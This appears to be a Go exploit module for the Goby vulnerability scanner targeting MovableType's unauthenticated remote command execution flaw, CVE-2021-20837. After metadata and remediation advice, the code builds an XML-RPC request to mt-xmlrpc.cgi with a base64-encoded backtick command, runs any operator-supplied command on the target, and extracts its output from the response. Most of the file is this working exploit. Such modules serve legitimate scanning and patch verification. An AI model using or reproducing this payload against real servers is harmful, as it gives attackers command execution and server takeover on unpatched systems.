package exploits

import (
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "MovableType RCE (CVE-2021-20837)",
    "Description": "<p>MovableType is a safe, high-speed, serverless SaaS type comprehensive CMS system.</p><p>Unauthorized command execution exists when the MovableType management system processes XMLRPC requests, and attackers can obtain server permissions.</p>",
    "Impact": "MovableType RCE (CVE-2021-20837)",
    "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://movabletype.net\">https://movabletype.net</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "MovableType",
    "VulType": [
        "Command Execution"
    ],
    "Tags": [
        "Command Execution"
    ],
    "Translation": {
        "CN": {
            "Name": "MovableType 管理系统远程命令执行漏洞（CVE-2021-20837）",
            "Description": "<p>MovableType是一款安全、高速、无服务器的SaaS型全面CMS系统。</p><p>MovableType 管理系统处理 XMLRPC 请求时存在未授权的命令执行，攻击者可获取服务器权限。</p>",
            "Impact": "<p>MovableType 管理系统处理 XMLRPC 请求时存在未授权的命令执行，攻击者可获取服务器权限。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://movabletype.net\">https://movabletype.net</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "MovableType",
            "VulType": [
                "命令执行"
            ],
            "Tags": [
                "命令执行"
            ]
        },
        "EN": {
            "Name": "MovableType RCE (CVE-2021-20837)",
            "Description": "<p>MovableType is a safe, high-speed, serverless SaaS type comprehensive CMS system.</p><p>Unauthorized command execution exists when the MovableType management system processes XMLRPC requests, and attackers can obtain server permissions.</p>",
            "Impact": "MovableType RCE (CVE-2021-20837)",
            "Recommendation": "<p>The vendor has released a bug fix, please pay attention to the update in time: <a href=\"https://movabletype.net\">https://movabletype.net</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "MovableType",
            "VulType": [
                "Command Execution"
            ],
            "Tags": [
                "Command Execution"
            ]
        }
    },
    "FofaQuery": "body=\"Movable Type\"",
    "GobyQuery": "body=\"Movable Type\"",
    "Author": "1291904552@qq.com",
    "Homepage": "https://movabletype.net/",
    "DisclosureDate": "2021-10-25",
    "References": [
        "https://nemesis.sh/posts/movable-type-0day/"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "3",
    "CVSS": "9.0",
    "CVEIDs": [
        "CVE-2021-20837"
    ],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "id",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "MovableType"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10235"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			Rand1 := 100000 + rand.Intn(10000)
			Rand2 := 85000 + rand.Intn(10000)
			cmd := fmt.Sprintf("`expr %d - %d`", Rand1, Rand2)
			cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
			uri := "/cgi-bin/mt/mt-xmlrpc.cgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Data = fmt.Sprintf(`<?xml version="1.0"?>
<methodCall>
<methodName>mt.handler_to_coderef</methodName>
<params>
<param><value><base64>
%s
</base64></value></param>
</params>
</methodCall>`, cmdBase64)
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				return resp.StatusCode == 200 && strings.Contains(resp.RawBody, strconv.Itoa(Rand1-Rand2))
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := "`" + ss.Params["cmd"].(string) + "`"
			cmdBase64 := base64.StdEncoding.EncodeToString([]byte(cmd))
			uri := "/cgi-bin/mt/mt-xmlrpc.cgi"
			cfg := httpclient.NewPostRequestConfig(uri)
			cfg.VerifyTls = false
			cfg.Header.Store("Content-Type", "text/xml")
			cfg.Data = fmt.Sprintf(`<?xml version="1.0"?>
<methodCall>
<methodName>mt.handler_to_coderef</methodName>
<params>
<param><value><base64>
%s
</base64></value></param>
</params>
</methodCall>`, cmdBase64)
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if resp.StatusCode == 200 {
					body := regexp.MustCompile("failed loading package((.|\\n)*?)MT::handler_to_coderef").FindStringSubmatch(resp.RawBody)
					expResult.Output = body[1]
					expResult.Success = true
				}
			}
			return expResult
		},
	))
}
